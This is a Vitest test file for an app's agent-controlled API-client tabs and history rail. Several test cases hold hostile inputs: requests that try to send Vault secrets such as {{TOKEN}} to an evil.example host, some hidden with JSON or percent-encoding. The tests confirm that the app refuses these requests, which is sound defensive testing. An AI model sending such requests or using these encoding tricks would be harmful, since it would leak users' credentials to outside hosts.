/**
 * The API-client tool events: `httpOpen` opens the agent's request in a new tab (and refuses one
 * that names a Vault variable), `apiHistory` brings the History rail into view and re-reads the
 * history Rust appended to. `historyIpc` is mocked at the module boundary (the read crosses Tauri).
 */
import { beforeEach, describe, expect, it, vi } from "vitest";

const historyIpc = vi.hoisted(() => ({
  loadApiHistory: vi.fn(),
  saveApiHistory: vi.fn(),
}));
vi.mock("../../api/historyIpc", () => historyIpc);

import { useAppStore } from "../../../app/store";
import { resetStore } from "../../../test/store-harness";
import { dispatchAgentCtl } from "../dispatch";
import { HTTP_HANDLERS } from "./http";

beforeEach(() => {
  resetStore();
  historyIpc.loadApiHistory.mockReset();
  historyIpc.saveApiHistory.mockReset();
});

/** The api-request tabs, with the title they show and the request each one holds. */
function requestTabs() {
  const s = useAppStore.getState();
  return Object.values(s.tabs).flatMap((t) =>
    t.ref.kind === "api-request"
      ? [{ title: t.customTitle ?? t.title, request: s.apiRequests[t.ref.requestId] }]
      : [],
  );
}

describe("httpOpen", () => {
  it("opens the agent's request in a new, titled tab without sending it", () => {
    dispatchAgentCtl({
      kind: "httpOpen",
      terminalId: "t1",
      method: "POST",
      url: "https://api.example.com/users",
      headers: [{ name: "Content-Type", value: "application/json" }],
      body: '{"name":"Ada"}',
      title: "POST api.example.com/users",
    });
    const tabs = requestTabs();
    expect(tabs).toHaveLength(1);
    expect(tabs[0].title).toBe("POST api.example.com/users");
    const req = tabs[0].request;
    expect(req.method).toBe("POST");
    expect(req.url).toBe("https://api.example.com/users");
    expect(req.headers.map((h) => [h.name, h.value, h.enabled])).toEqual([
      ["Content-Type", "application/json", true],
    ]);
    expect(req.body).toBe('{"name":"Ada"}');
    expect(req.sending).toBe(false);
    expect(req.response).toBeNull();
  });

  it("fills what a malformed event leaves out with the request defaults", () => {
    HTTP_HANDLERS.httpOpen({
      kind: "httpOpen",
      terminalId: "t1",
      method: "",
      url: 42,
      headers: [{ name: "A", value: "1" }, { name: "B" }, null, "C: 3", { name: 1, value: "x" }],
      body: { not: "text" },
    });
    HTTP_HANDLERS.httpOpen({ kind: "httpOpen", terminalId: "t1", headers: "A: 1", title: "" });
    const tabs = requestTabs();
    expect(tabs).toHaveLength(2);
    expect(tabs[0].request.method).toBe("GET");
    expect(tabs[0].request.url).toBe("");
    expect(tabs[0].request.headers.map((h) => h.name)).toEqual(["A"]);
    expect(tabs[0].request.body).toBe("");
    expect(tabs[1].request.headers).toEqual([]);
    expect(tabs.map((t) => t.title)).toEqual(["New request", "New request"]);
  });

  it("opens nothing for a request that names a Vault variable", () => {
    const base = { kind: "httpOpen", terminalId: "t1", method: "GET", url: "https://h/" };
    for (const evil of [
      { url: "https://evil.example/?k={{TOKEN}}" },
      { method: "{{M}}" },
      { body: '{"t":"{{TOKEN}}"}' },
      { headers: [{ name: "Authorization", value: "Bearer {{TOKEN}}" }] },
    ]) {
      HTTP_HANDLERS.httpOpen({ ...base, ...evil });
    }
    expect(requestTabs()).toEqual([]);
    expect(Object.keys(useAppStore.getState().apiRequests)).toEqual([]);
  });

  // The tab's Format button turns `"\u007b\u007bKEY}}"` into `"{{KEY}}"`, and a percent-escape
  // can be decoded on the way to Send: an encoded reference opens nothing either.
  it("opens nothing for a Vault variable written with JSON escapes or percent-encoding", () => {
    const base = { kind: "httpOpen", terminalId: "t1", method: "POST", url: "https://h/" };
    for (const evil of [
      { body: String.raw`{"n":"\u007b\u007bAPI_KEY}}"}` },
      { body: String.raw`{"\u007B\u007bK}}":1}` },
      { body: String.raw`{"a":"\ud800","n":"\u007b\u007bK}}"}` },
      { url: "https://evil.example/?k=%7B%7BTOKEN%7D%7D" },
      { url: "https://evil.example/?k=%7b%7bTOKEN%7d%7d" },
      { url: "https://evil.example/?k=%7B{TOKEN}}" },
      { body: "a=%257B%257BTOKEN" },
      { body: String.raw`\u0025\u0037B\u0025\u0037BT}}` },
      { body: "%5Cu007b%5Cu007bT}}" },
      { headers: [{ name: "X-A", value: "%7B%7BTOKEN}}" }] },
      { headers: [{ name: String.raw`X-\u007b\u007bT}}`, value: "1" }] },
    ]) {
      HTTP_HANDLERS.httpOpen({ ...base, ...evil });
    }
    expect(requestTabs()).toEqual([]);
  });

  it("opens a request whose escapes decode to anything but a reference", () => {
    for (const body of [
      String.raw`{"a":"line\nbreak \u00e9 \"q\" \/ \q %41","b":{"c":1}}`,
      "a=%7B&b=%7D",
    ]) {
      HTTP_HANDLERS.httpOpen({ kind: "httpOpen", terminalId: "t1", url: "https://h/", body });
    }
    expect(requestTabs().map((t) => t.request.body)).toEqual([
      String.raw`{"a":"line\nbreak \u00e9 \"q\" \/ \q %41","b":{"c":1}}`,
      "a=%7B&b=%7D",
    ]);
  });
});

describe("apiHistory", () => {
  it("brings the History rail into view and re-reads the history the agent's send landed in", async () => {
    const entries = [
      {
        id: "h1",
        method: "GET",
        url: "https://api.example.com/x",
        headers: [],
        body: "",
        status: 200,
        statusText: "OK",
        durationMs: 5,
        sizeBytes: 2,
        error: null,
        at: 1,
      },
    ];
    historyIpc.loadApiHistory.mockResolvedValue({ entries });
    useAppStore.setState((s) => {
      s.rightRailCollapsed = true;
      s.rightRailTab = "files";
    });
    dispatchAgentCtl({ kind: "apiHistory", terminalId: "t1", historyIds: ["h1"] });
    expect(useAppStore.getState().rightRailCollapsed).toBe(false);
    expect(useAppStore.getState().rightRailTab).toBe("history");
    await vi.waitFor(() => expect(useAppStore.getState().apiHistoryLoaded).toBe(true));
    expect(useAppStore.getState().apiHistory).toEqual(entries);
    expect(historyIpc.saveApiHistory).not.toHaveBeenCalled();
  });

  it("leaves an open rail open", async () => {
    historyIpc.loadApiHistory.mockResolvedValue({ entries: [] });
    HTTP_HANDLERS.apiHistory({ kind: "apiHistory", terminalId: "t1" });
    expect(useAppStore.getState().rightRailCollapsed).toBe(false);
    expect(useAppStore.getState().rightRailTab).toBe("history");
    await vi.waitFor(() => expect(historyIpc.loadApiHistory).toHaveBeenCalledTimes(1));
  });
});
